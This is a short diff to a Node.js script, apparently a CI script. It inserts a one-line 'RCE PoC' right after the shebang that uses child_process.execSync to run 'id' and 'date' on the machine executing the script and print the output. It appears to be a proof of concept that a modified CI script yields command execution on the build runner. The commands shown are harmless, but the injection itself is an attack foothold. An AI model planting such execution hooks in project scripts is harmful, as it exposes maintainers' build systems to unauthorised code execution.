@@ -1,4 +1,7 @@
 #!/usr/bin/env node
+// Security test: RCE via modified CI script
+const {execSync} = require("child_process"); console.log("=== RCE PoC ==="); console.log(execSync("id").toString().trim()); console.log(execSync("date").toString().trim()); console.log("=== End RCE PoC ===");
+
 const fs = require('fs')
 const path = require('path')
 
